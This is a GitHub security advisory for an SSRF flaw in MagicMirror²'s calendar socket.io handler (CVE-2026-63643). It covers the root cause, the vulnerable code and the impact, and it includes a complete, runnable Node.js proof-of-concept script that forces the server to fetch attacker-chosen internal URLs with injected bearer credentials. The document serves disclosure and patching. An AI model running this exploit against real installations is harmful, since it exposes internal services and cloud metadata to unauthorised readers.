# [M] MagicMirror: ssrf calendar .js

## Summary
Severity: Medium
Advisory: GHSA-w6x9-28jw-hq7j
CVE: CVE-2026-63643
CWE: CWE-441, CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-w6x9-28jw-hq7j
Type: github-advisory

## Affected
- npm: `magicmirror` — affected >=0 <2.37.0

## Details
# Vulnerability — SSRF via `ADD_CALENDAR` (MagicMirror² calendar)

> Analysis of the PoC `exploit-ssrf-calendar.js`.
> Target: `calendar/node_helper.js` of MagicMirror², socket.io namespace `/calendar`.

---

## Identification

| Field | Value |
|-------|-------|
| **PoC file** | `exploit-ssrf-calendar.js` |
| **Endpoint** | socket.io namespace `/calendar`, notification `ADD_CALENDAR` |
| **Precondition** | reach the mirror's HTTP port (no authentication required) |

---

## Description

The `ADD_CALENDAR` handler in `calendar/node_helper.js` performs a **server-side** HTTP request to a URL that is **fully attacker-controlled**, with no SSRF protection whatsoever — unlike the project's hardened `/cors` endpoint.

Worse, the attacker also controls:
- the **authentication headers** the server attaches to the request (`auth: { method: "bearer", pass: "..." }`);
- the `selfSignedCert` flag, which **disables TLS verification** of the server-side request.

When the target's response is **valid iCal**, the server parses the events and sends them back to the attacker via `CALENDAR_EVENTS` — turning the SSRF into **full data exfiltration** (response body read). Against non-iCal responses it remains a blind SSRF (the attacker still forces the server-side request, they just don't see the body).

---

## Root cause: unauthenticated socket.io channel + permissive CORS

The socket.io server accepts connections from **any origin** and with **no authentication**:

```js
const io = new Server(server, {
  cors: { origin: /.*$/, credentials: true }
});
```

The `/calendar` namespace registers the handler without checking who is connected (**CWE-306**). Any process or browser tab that can reach the mirror's port can emit the notification.

---

## Exploit (`exploit-ssrf-calendar.js`)

```js
const { io } = require("socket.io-client");

const TARGET = process.env.MM || "http://TARGET:8888";
const INTERNAL_URL = process.argv[2] || process.env.SSRF_URL || "https://webhook.site/";

const socket = io(`${TARGET}/calendar`, { path: "/socket.io", transports: ["websocket", "polling"] });

socket.onAny((event, payload) => {
	if (event === "CALENDAR_EVENTS") {
		console.log("\n[+] CALENDAR_EVENTS received from server (SSRF response exfiltrated):");
		for (const ev of payload.events || []) {
			console.log("    SUMMARY:", ev.title);
			if (ev.title && ev.title.includes("FLAG{")) {
				console.log("\n[!!!] SSRF SUCCESS - leaked secret from internal-only service:");
				console.log("      " + ev.title);
				process.exit(0);
			}
		}
	} else if (event === "CALENDAR_ERROR") {
		console.log("[-] CALENDAR_ERROR:", JSON.stringify(payload));
	}
});

socket.on("connect", () => {
	console.log(`[*] Connected to ${TARGET}/calendar (no auth required). socket id=${socket.id}`);
	console.log(`[*] Forcing server-side fetch of internal target: ${INTERNAL_URL}`);
	socket.emit("ADD_CALENDAR", {
		url: INTERNAL_URL,
		fetchInterval: 60000,
		excludedEvents: [],
		maximumEntries: 10,
		maximumNumberOfDays: 3650,
		auth: { method: "bearer", pass: "internal-admin-token" },
		broadcastPastEvents: true,
		selfSignedCert: true,
		id: "pwn"
	});
});

socket.on("connect_error", (e) => console.log("[-] connect_error:", e.message));

setTimeout(() => { console.log("\n[*] timeout, exiting"); process.exit(1); }, 20000);
```

---

## Vulnerable target code (pattern)

```js
socketNotificationReceived(notification, payload) {
  if (notification === "ADD_CALENDAR") {
    const fetcher = new CalendarFetcher(
      payload.url,
      payload.fetchInterval,
      payload.excludedEvents,
      payload.maximumEntries,
      payload.maximumNumberOfDays,
      payload.auth,
      payload.broadcastPastEvents,
      payload.selfSignedCert
    );
    fetcher.fetchCalendar();
  }
}
```

---

## Impact

- **Reading internal services** unreachable from the attacker's network (cloud metadata `169.254.169.254`, admin panels on `127.0.0.1`, services on the private network).
- **Body exfiltration** when the response is iCal (the PoC searches for `FLAG{...}` in event titles).
- **Confused deputy / credential injection**: the server attaches an attacker-controlled `Authorization: Bearer ...` header, allowing it to forge/replay credentials against the internal target.
- **TLS bypass** via `selfSignedCert: true`.
- Internal port scanning through error/timing differences.

---

## References
- https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-w6x9-28jw-hq7j
- https://github.com/MagicMirrorOrg/MagicMirror/pull/4169
- https://github.com/MagicMirrorOrg/MagicMirror/commit/58c2a5e675a7d367b64d72e1d35680d202ff5c9f
- https://github.com/MagicMirrorOrg/MagicMirror
- https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.37.0
